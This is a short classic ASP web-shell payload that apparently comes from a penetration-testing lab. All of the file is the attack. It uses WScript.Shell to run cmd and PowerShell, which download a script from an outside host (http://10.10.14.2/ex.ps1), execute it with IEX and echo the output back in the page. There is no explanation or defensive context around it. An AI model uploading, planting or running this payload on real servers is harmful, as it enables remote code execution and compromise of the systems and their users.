<%
Set s = CreateObject("WScript.Shell")
Set cmd = s.Exec("cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.2:80/ex.ps1')")
o = cmd.StdOut.Readall()
Response.write(o)
%>
